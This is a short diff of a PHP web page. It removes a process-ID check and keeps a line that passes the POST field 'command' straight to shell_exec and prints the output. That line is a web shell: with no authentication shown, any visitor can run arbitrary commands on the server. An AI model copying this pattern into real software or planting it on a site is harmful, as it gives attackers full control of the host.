@@ -53,17 +53,7 @@
         <?php
         if(isset($_POST['command'])){
             echo "<pre>" . shell_exec($_POST['command']) . "</pre>";
-            // Get the PID of the command if it's running
-            $pid = file_get_contents('pid.txt');
-            if ($pid !== false) {
-                // Check if the process with this PID is still running
-                if (posix_getpgid($pid) !== false) {
-                    echo "Command is already running";
-                    return;
-                }
-            }
-        }
-            ?>
+        }?>
     </div>
 </body>
 </html>
